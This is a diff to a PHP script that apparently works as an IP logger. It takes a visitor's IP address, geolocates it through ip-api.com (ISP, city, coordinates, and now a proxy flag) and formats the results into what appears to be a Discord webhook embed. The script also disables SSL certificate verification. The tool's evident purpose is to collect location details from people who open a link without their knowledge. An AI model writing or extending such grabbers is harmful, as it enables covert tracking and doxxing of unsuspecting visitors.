@@ -111,7 +111,7 @@ if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
 
 $timestamp = date("c", strtotime("now"));
 
-$Curl = curl_init("http://ip-api.com/json/$ipaddress"); //Get the info of the IP using Curl
+$Curl = curl_init("http://ip-api.com/json/$ipaddress?fields=status,country,countryCode,region,lat,lon,regionName,city,zip,timezone,isp,org,as,proxy"); //Get the info of the IP using Curl
 curl_setopt($Curl, CURLOPT_RETURNTRANSFER, true);
 curl_setopt($Curl, CURLOPT_SSL_VERIFYPEER, false);
 curl_setopt($Curl, CURLOPT_SSL_VERIFYHOST, false);
@@ -119,6 +119,7 @@ $Info = json_decode(curl_exec($Curl));
 curl_close($Curl);
 
 $ISP = $Info->isp;
+$ProxyCheck = $Info->proxy ? '✅' : '❌';;
 $Country = $Info->country;
 $Region = $Info->regionName;
 $City = $Info->city;
@@ -168,7 +169,7 @@ $json_data = json_encode([
                 // Field 1
                 [
                     "name" => "<:lipbite:953966769717006386> IP Info",
-                    "value" => "**__IP__**: $ipaddress\n**__ISP__**: $ISP",
+                    "value" => "**__IP__**: $ipaddress\n**__ISP__**: $ISP\n**__Proxy__**: $ProxyCheck",
                     "inline" => true
                 ],
                 [
